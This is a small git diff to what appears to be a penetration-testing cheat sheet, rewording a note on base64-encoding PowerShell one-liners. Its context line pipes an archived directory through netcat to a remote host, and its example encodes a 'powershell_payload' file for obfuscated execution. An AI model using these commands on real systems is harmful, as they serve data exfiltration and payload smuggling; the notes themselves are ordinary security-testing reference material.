@@ -160,7 +160,8 @@ tar cvf - . | xz -c | nc 192.168.0.1 9999
 ```
 
 ## Base64 encode
-* You could use this for encoding powershell one-liners
+* Some use cases:
+    * Encoding [Powershell one-liners](../Windows/Shells.html#one-liners)
 ```bash
 iconv -f ASCII -t UTF-16LE powershell_payload.txt | base64 | tr -d "\n"
 ```
